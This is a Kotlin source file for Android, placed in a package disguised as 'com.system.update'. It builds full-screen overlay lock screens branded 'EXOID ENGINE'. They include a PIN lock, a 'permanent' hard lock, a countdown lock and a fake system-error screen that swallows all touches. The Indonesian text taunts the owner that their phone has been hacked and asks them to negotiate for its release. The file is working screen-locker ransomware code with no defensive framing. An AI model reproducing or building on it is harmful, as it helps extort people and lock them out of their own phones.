package com.system.update

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.text.Editable
import android.text.InputType
import android.text.TextWatcher
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.inputmethod.InputMethodManager
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView

object LockOverlayView {

    fun paramsFull(): WindowManager.LayoutParams {
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
    }

    private fun dp(ctx: Context, value: Int): Int =
        TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value.toFloat(),
            ctx.resources.displayMetrics
        ).toInt()

    private fun cardBg(): GradientDrawable {
        return GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = 40f
            setColor(Color.parseColor("#CC0A0A0A"))
            setStroke(4, Color.parseColor("#D4AF37"))
            gradientType = GradientDrawable.LINEAR_GRADIENT
            orientation = GradientDrawable.Orientation.TOP_BOTTOM
            colors = intArrayOf(
                Color.parseColor("#F00A0A0A"),
                Color.parseColor("#F01A0000")
            )
        }
    }

    private fun btnBg(color: String): GradientDrawable {
        return GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = 24f
            setColor(Color.parseColor(color))
            setStroke(2, Color.parseColor("#F5D76E"))
        }
    }

    private fun pinBox(ctx: Context): TextView {
        return TextView(ctx).apply {
            text = "_"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 28f)
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 12f
                setColor(Color.parseColor("#CC141414"))
                setStroke(2, Color.parseColor("#00FF66"))
            }
            setPadding(0, dp(ctx, 10), 0, 0)
        }
    }

    // ============================================================
    // LOCK PIN (pakai keyboard HP)
    // ============================================================
    fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val glow = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#8A0000"))
            alpha = 0.2f
        }
        root.addView(glow, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val card = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
            background = cardBg()
        }

        val icon = TextView(ctx).apply {
            text = "\u2620"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 72f)
            gravity = Gravity.CENTER
        }

        val logo = TextView(ctx).apply {
            text = "EXOID ENGINE"
            setTextColor(Color.parseColor("#F5D76E"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.25f
            setPadding(0, dp(ctx, 10), 0, dp(ctx, 4))
        }

        val logoSub = TextView(ctx).apply {
            text = "LOCK BY EXOID ENGINE"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.4f
            setPadding(0, 0, 0, dp(ctx, 20))
        }

        val divider = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#D4AF37"))
        }
        val dividerParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            dp(ctx, 2)
        ).apply { setMargins(0, 0, 0, dp(ctx, 20)) }
        card.addView(divider, dividerParams)

        val title = TextView(ctx).apply {
            text = "DEVICE TERKUNCI"
            setTextColor(Color.parseColor("#F0F0F0"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.15f
        }

        val subtitle = TextView(ctx).apply {
            text = "Masukkan 4 angka PIN"
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 6), 0, dp(ctx, 18))
        }

        val pinDisplay = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }

        val pinBoxes = mutableListOf<TextView>()
        for (i in 0 until 4) {
            val box = pinBox(ctx)
            box.width = dp(ctx, 48)
            box.height = dp(ctx, 58)
            val lp = LinearLayout.LayoutParams(dp(ctx, 48), dp(ctx, 58))
            lp.setMargins(dp(ctx, 5), 0, dp(ctx, 5), 0)
            pinDisplay.addView(box, lp)
            pinBoxes.add(box)
        }
        card.addView(pinDisplay)

        val status = TextView(ctx).apply {
            text = ""
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 14), 0, dp(ctx, 10))
        }
        card.addView(status)

        val btn = Button(ctx).apply {
            text = "BUKA"
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 16f)
            typeface = Typeface.DEFAULT_BOLD
            letterSpacing = 0.3f
            background = btnBg("#B30000")
        }
        card.addView(btn)

        val floating = TextView(ctx).apply {
            text = "SYSTEM LOCKED"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
            alpha = 0.4f
            letterSpacing = 0.3f
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 14), 0, 0)
        }
        ObjectAnimator.ofFloat(floating, "alpha", 0.15f, 0.7f, 0.15f).apply {
            duration = 1800
            repeatCount = ValueAnimator.INFINITE
            start()
        }
        card.addView(floating)

        card.addView(icon, 0)
        card.addView(logo, 1)
        card.addView(logoSub, 2)
        card.addView(title, 4)
        card.addView(subtitle, 5)

        val cardParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(card, cardParams)

        // Invisible EditText untuk trigger keyboard HP
        val hiddenInput = EditText(ctx).apply {
            alpha = 0f
            width = 1
            height = 1
            inputType = InputType.TYPE_CLASS_NUMBER
            maxEms = 4
            isFocusable = true
            isFocusableInTouchMode = true
        }
        val hiddenParams = FrameLayout.LayoutParams(1, 1)
        root.addView(hiddenInput, hiddenParams)

        hiddenInput.postDelayed({
            try {
                hiddenInput.requestFocus()
                val imm = ctx.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.showSoftInput(hiddenInput, InputMethodManager.SHOW_IMPLICIT)
            } catch (_: Exception) {}
        }, 400)

        hiddenInput.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                val txt = s?.toString() ?: ""
                if (txt.length > 4) {
                    hiddenInput.setText(txt.substring(0, 4))
                    hiddenInput.setSelection(4)
                    return
                }

                for (i in 0 until 4) {
                    pinBoxes[i].text = if (i < txt.length) "\u25CF" else "_"
                }

                if (txt.length == 4) {
                    if (txt == correctPin) {
                        try {
                            val imm = ctx.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                            imm.hideSoftInputFromWindow(hiddenInput.windowToken, 0)
                        } catch (_: Exception) {}
                        onUnlock(root)
                    } else {
                        status.text = "PIN SALAH"
                        for (b in pinBoxes) {
                            ObjectAnimator.ofFloat(b, "translationX", 0f, 18f, -18f, 18f, -18f, 0f).apply {
                                duration = 400
                                start()
                            }
                        }
                        hiddenInput.postDelayed({
                            hiddenInput.setText("")
                            for (b in pinBoxes) b.text = "_"
                        }, 500)
                    }
                }
            }
        })

        btn.setOnClickListener {
            val txt = hiddenInput.text.toString()
            if (txt == correctPin) {
                onUnlock(root)
            } else {
                status.text = "PIN SALAH"
            }
        }

        ObjectAnimator.ofFloat(glow, "alpha", 0.15f, 0.35f, 0.15f).apply {
            duration = 2000
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        return root
    }

    // ============================================================
    // LOCK HARD
    // ============================================================
    fun buildHard(ctx: Context): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val glow = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#8A0000"))
            alpha = 0.3f
        }
        root.addView(glow, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
            background = cardBg()
        }

        val triangle = TextView(ctx).apply {
            text = "\u26A0"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 100f)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(triangle, "scaleX", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }
        ObjectAnimator.ofFloat(triangle, "scaleY", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "HAHAHA HP LU TERKUNCI HARD!!!!"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 24), 0, dp(ctx, 8))
        }

        val logo = TextView(ctx).apply {
            text = "LOCK BY EXOID ENGINE"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 14f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 8), 0, dp(ctx, 20))
        }

        val msg = TextView(ctx).apply {
            text = "Perangkat terkunci permanen.\nMatikan daya untuk melepas."
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(ctx, 24))
        }

        val warning = TextView(ctx).apply {
            text = "JANGAN MATIKAN DAYA"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 13f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(warning, "alpha", 0.3f, 1f, 0.3f).apply {
            duration = 1200
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(logo)
        container.addView(msg)
        container.addView(warning)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        ObjectAnimator.ofFloat(glow, "alpha", 0.2f, 0.4f, 0.2f).apply {
            duration = 1800
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        return root
    }

    // ============================================================
    // LOCK TIMER
    // ============================================================
    fun buildTimer(ctx: Context, durationMs: Long, onUnlock: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
            background = cardBg()
        }

        val triangle = TextView(ctx).apply {
            text = "\u26A0"
            setTextColor(Color.parseColor("#FFC107"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 80f)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(triangle, "alpha", 0.4f, 1f, 0.4f).apply {
            duration = 1400
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "HP ANDA SUDAH KAMI RETAS"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 17f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 20), 0, dp(ctx, 8))
        }

        val logo = TextView(ctx).apply {
            text = "LOCK BY EXOID ENGINE"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 8), 0, dp(ctx, 16))
        }

        val message = TextView(ctx).apply {
            text = "Mohon bicara baik-baik jika mau di lepas lock nya."
            setTextColor(Color.parseColor("#D4AF37"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(ctx, 24))
        }

        val timerText = TextView(ctx).apply {
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 46f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.15f
        }

        val subTimer = TextView(ctx).apply {
            text = "WAKTU TERSISA"
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 8), 0, 0)
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(logo)
        container.addView(message)
        container.addView(timerText)
        container.addView(subTimer)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        val handler = Handler(Looper.getMainLooper())
        val endTime = System.currentTimeMillis() + durationMs
        handler.post(object : Runnable {
            override fun run() {
                val left = endTime - System.currentTimeMillis()
                if (left <= 0) {
                    onUnlock(root)
                    return
                }
                val d = left / 86_400_000
                val h = (left % 86_400_000) / 3_600_000
                val m = (left % 3_600_000) / 60_000
                val s = (left % 60_000) / 1000
                timerText.text = if (d > 0)
                    String.format("%dd %02d:%02d:%02d", d, h, m, s)
                else
                    String.format("%02d:%02d:%02d", h, m, s)
                handler.postDelayed(this, 1000)
            }
        })

        return root
    }

    // ============================================================
    // CRASH
    // ============================================================
    fun buildCrash(ctx: Context, onDismiss: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
            background = cardBg()
        }

        val error = TextView(ctx).apply {
            text = "\u26A0"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 80f)
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "SYSTEM ERROR"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 16), 0, dp(ctx, 8))
        }

        val logo = TextView(ctx).apply {
            text = "LOCK BY EXOID ENGINE"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 8), 0, dp(ctx, 20))
        }

        val msg = TextView(ctx).apply {
            text = "Sentuhan dinonaktifkan sementara."
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
        }

        val hint = TextView(ctx).apply {
            text = "TOUCH DISABLED"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            gravity = Gravity.CENTER
            alpha = 0.5f
            setPadding(0, dp(ctx, 12), 0, 0)
        }
        ObjectAnimator.ofFloat(hint, "alpha", 0.15f, 0.7f, 0.15f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(error)
        container.addView(title)
        container.addView(logo)
        container.addView(msg)
        container.addView(hint)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        root.setOnTouchListener { _, _ -> true }
        return root
    }
}
